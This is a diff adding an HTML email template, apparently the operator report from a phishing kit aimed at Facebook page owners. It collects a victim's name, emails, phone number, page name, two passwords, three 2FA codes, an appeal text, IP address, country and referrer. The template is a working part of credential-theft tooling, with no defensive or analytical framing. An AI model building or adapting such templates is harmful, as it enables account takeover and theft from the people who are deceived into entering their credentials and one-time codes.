@@ -1,0 +1,61 @@
+Subject: {{country}}
+Content : 
+<table style="width: 100%; height: 259px;" border="0">
+    <colgroup>
+        <col style="width: 20.5622%;">
+        <col style="width: 79.4541%;">
+    </colgroup>
+    <tbody>
+        <tr style="line-height: 30px;">
+            <td style="text-align: center; line-height: 30px; background: #355797; color: white" colspan="2">{{user_ip}} USER
+                INFO</td>
+        </tr>
+        
+        <tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>Full Name: </b>{{full-name}}</td>
+        </tr>
+        <tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>Business Email: </b>{{buiseness-email}}</td>
+        </tr>
+        <tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>Personal Email: </b>{{personal-email}}</td>
+        </tr>
+        <tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>Phone Number: </b>{{mobile-phone-number}}</td>
+        </tr>
+        <tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>Facebook Page Name: </b>{{page-name}}</td>
+        </tr>
+        <tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>Password One: </b>{{password-1}}</td>
+        </tr>
+<tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>Password Two: </b>{{password-2}}</td>
+        </tr>
+        
+        
+<tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>2FA One: </b>{{2FA-1}}</td>
+        </tr>
+<tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>2FA Two: </b>{{2FA-2}}</td>
+        </tr>
+<tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>2FA There: </b>{{2FA-3}}</td>
+        </tr>
+        
+        <tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>Additiional Info: </b>{{apeal}}</td>
+        </tr>
+        <tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>Location: </b>{{user_ip}}-{{country}}</td>
+        </tr>
+        <tr style="line-height: 30px;">
+            <td style="height: 18.5px;" colspan="2"><b>User Referrer: </b>{{user_referrer}}</td>
+        </tr>
+        <tr>
+            <td colspan="2" style="text-align: center; line-height: 30px; background: #355797; color: white">&nbsp;</td>
+        </tr>
+    </tbody>
+</table>
+<p>&nbsp;</p>
